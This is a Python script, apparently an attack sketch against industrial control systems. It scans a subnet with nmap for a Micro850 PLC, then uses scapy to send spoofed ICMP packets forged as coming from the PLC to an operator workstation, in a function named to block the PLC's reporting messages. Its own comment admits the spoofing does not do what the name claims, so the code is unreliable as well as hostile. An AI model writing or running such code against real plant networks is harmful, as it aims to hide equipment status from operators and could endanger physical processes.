import subprocess
from scapy.all import *
import time
import threading

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'Micro850' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def block_reporting_messages(plc_ip, workstation_ip):
    # Example of spoofing an ICMP packet (not directly applicable but shows packet manipulation)
    packet = IP(src=plc_ip, dst=workstation_ip)/ICMP(type=0)
    while True:
        send(packet, verbose=0)
        time.sleep(1)  # Send a packet every second

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        workstation_ip = input("Enter the workstation IP: ")
        block_thread = threading.Thread(target=block_reporting_messages, args=(plc_ip, workstation_ip))
        block_thread.daemon = True  # So that the thread dies when main thread dies
        block_thread.start()
        while True:
            user_input = input("Type 'top' to stop blocking: ")
            if user_input.lower() == 'top':
                break
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()